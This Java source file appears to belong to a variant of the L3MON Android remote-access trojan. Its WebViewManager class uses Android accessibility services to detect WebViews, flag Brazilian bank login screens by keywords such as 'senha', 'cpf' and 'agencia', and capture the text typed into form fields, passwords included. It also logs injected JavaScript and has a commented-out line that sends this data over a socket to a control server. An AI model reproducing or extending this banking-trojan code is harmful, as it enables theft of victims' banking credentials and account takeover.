package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

public class WebViewManager {

    private static final String[] WEBVIEW_CLASS_NAMES = {
            "android.webkit.WebView",
            "com.android.webview",
            "org.chromium.content.browser"
    };

    private static final String[] LOGIN_KEYWORDS = {
            "senha", "password", "pass", "login", "email", "cpf", "conta", "agencia"
    };

    /**
     * Detecta se existe WebView na tela atual
     */
    public boolean hasWebView(AccessibilityNodeInfo root) {
        if (root == null)
            return false;
        return findWebViewRecursive(root) != null;
    }

    private AccessibilityNodeInfo findWebViewRecursive(AccessibilityNodeInfo node) {
        if (node == null)
            return null;

        String className = node.getClassName() != null ? node.getClassName().toString() : "";
        for (String webViewClass : WEBVIEW_CLASS_NAMES) {
            if (className.contains(webViewClass)) {
                return node;
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findWebViewRecursive(child);
                if (result != null) {
                    child.recycle();
                    return result;
                }
                child.recycle();
            }
        }
        return null;
    }

    /**
     * Tenta capturar campos de formulário dentro de WebView
     */
    public List<JSONObject> captureWebFormFields(AccessibilityNodeInfo root) {
        List<JSONObject> fields = new ArrayList<>();
        if (root == null)
            return fields;

        captureFormFieldsRecursive(root, fields);
        return fields;
    }

    private void captureFormFieldsRecursive(AccessibilityNodeInfo node, List<JSONObject> fields) {
        if (node == null)
            return;

        if (node.isEditable()) {
            try {
                JSONObject field = new JSONObject();
                field.put("text", node.getText() != null ? node.getText().toString() : "");
                field.put("description",
                        node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                field.put("viewId", node.getViewIdResourceName() != null ? node.getViewIdResourceName() : "");
                field.put("timestamp", System.currentTimeMillis());

                fields.add(field);
            } catch (Exception ignored) {
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                captureFormFieldsRecursive(child, fields);
                child.recycle();
            }
        }
    }

    /**
     * Detecta se parece ser uma tela de login bancário via WebView
     */
    public boolean isBankLoginWebView(AccessibilityNodeInfo root) {
        if (root == null)
            return false;

        StringBuilder allText = new StringBuilder();
        collectAllText(root, allText);
        String content = allText.toString().toLowerCase();

        int matches = 0;
        for (String keyword : LOGIN_KEYWORDS) {
            if (content.contains(keyword))
                matches++;
        }

        return matches >= 2; // Pelo menos 2 palavras-chave de login
    }

    private void collectAllText(AccessibilityNodeInfo node, StringBuilder builder) {
        if (node == null)
            return;

        if (node.getText() != null) {
            builder.append(node.getText()).append(" ");
        }
        if (node.getContentDescription() != null) {
            builder.append(node.getContentDescription()).append(" ");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectAllText(child, builder);
                child.recycle();
            }
        }
    }

    /**
     * Tenta injetar JavaScript (limitado via Accessibility)
     * Na prática, isso geralmente é feito via addJavascriptInterface no app
     * original
     */
    public void attemptJSInjection(AccessibilityNodeInfo webViewNode, String jsCode) {
        // Nota: Injeção real de JS via AccessibilityService é muito limitada.
        // A forma mais comum é usar evaluateJavascript() quando temos referência ao
        // WebView.
        // Aqui apenas logamos a intenção.
        try {
            JSONObject event = new JSONObject();
            event.put("action", "webview_js_injection_attempt");
            event.put("jsCode", jsCode);
            event.put("timestamp", System.currentTimeMillis());

            // ConnectionManager.ioSocket.emit("0xWV", event);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}